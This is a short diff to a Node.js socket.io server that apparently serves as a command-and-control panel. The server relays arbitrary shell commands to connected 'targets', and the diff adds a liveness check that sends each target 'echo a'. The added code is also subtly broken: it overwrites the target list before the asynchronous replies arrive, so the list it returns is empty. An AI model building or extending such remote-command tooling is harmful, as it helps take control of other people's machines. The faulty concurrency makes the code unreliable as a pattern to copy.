@@ -39,8 +39,20 @@ io.on('connection', (socket)=>{
     };
    })
    socket.on('server-targets',()=>{
+    filtered_targets = []
+    for(let i=0; i < targets.length; i++){
+      io.timeout(5000).emit('cmd',JSON.stringify({"cmd":"echo a","target":targets[i]}),(err,res)=>{
+        if(err){
+          
+        }else{
+          filtered_targets.push(targets[i])
+        }
+      })
+    }
+    targets = filtered_targets
     socket.emit('res_targets',targets)
    })
+
    socket.on('server-cmd',(cmd)=>{
     console.log("Sending cmd to target")
     io.emit('cmd',cmd)
